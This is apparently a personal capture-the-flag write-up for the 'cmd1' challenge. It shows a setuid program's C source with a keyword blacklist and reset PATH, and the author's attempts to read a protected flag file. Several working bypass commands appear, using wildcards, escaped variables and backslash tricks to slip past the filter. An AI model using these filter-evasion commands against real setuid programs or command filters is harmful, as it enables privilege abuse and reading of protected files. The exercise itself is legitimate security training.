first of all I needed to do some recon.
first of seeing what files I have available

```bash
cmd1@ubuntu:~$ ls -l
total 24
-r-xr-sr-x 1 root cmd1_pwn 16056 Mar 21 09:49 cmd1
-rw-r--r-- 1 root root       353 Mar 21 09:47 cmd1.c
-r--r----- 1 root cmd1_pwn    46 Apr  1 06:06 flag
```
seeing these I could see the setuid permission on the cmd1 file.
this meant that I could run it with the permissions of cmd1_pwn.

knowing this I opened cmd1.c read it's code
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

seeing this I knew that I could print the flag using this code piece.
I decided to try and give the program an env variable that I created to pass the flag file path
`cmd1@ubuntu:~$ export FIlE=flag; ./cmd1 cat $FILE`

this did not work. and returned this error:
`sh: 1: cat: not found`

after some research I understood that it was because that the PATH env was reset at the start of the program
```c
putenv("PATH=/thankyouverymuch");
```
so I had to give the absolute path to the command

`cmd1@ubuntu:~$ export FIlE=flag; ./cmd1 /bin/cat $FILE`

this command froze the program because I forgot that I did not give one argv containing the command but two
```c
argv[1]="/bin/cat"
argv[2]="$FILE"
```

so once combining them into one string the command just did not work because it was caught in the `filter` function. apparently the env vars are parsed before sent so I had to think in a different direction.

I tried running using python the following command (but obviously it did not work)
`cmd1@ubuntu:~$ ./cmd1 "python -c 'import os; os.system(\"/bin/cat $FILE\")'"`
because it still parsed the env var `FILE`

Now I remembered that I can use and asterix to cat all of the files and since the flag was the last one I had no problem.
and this worked
`cmd1@ubuntu:~$ ./cmd1 "/bin/cat *"`

**Other Solutions**
`cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"`
`cmd1@ubuntu:~$ export file=flag; ./cmd1 "/bin/cat \$file"`
`cmd1@ubuntu:~$ ./cmd1 "/bin/cat f\lag"`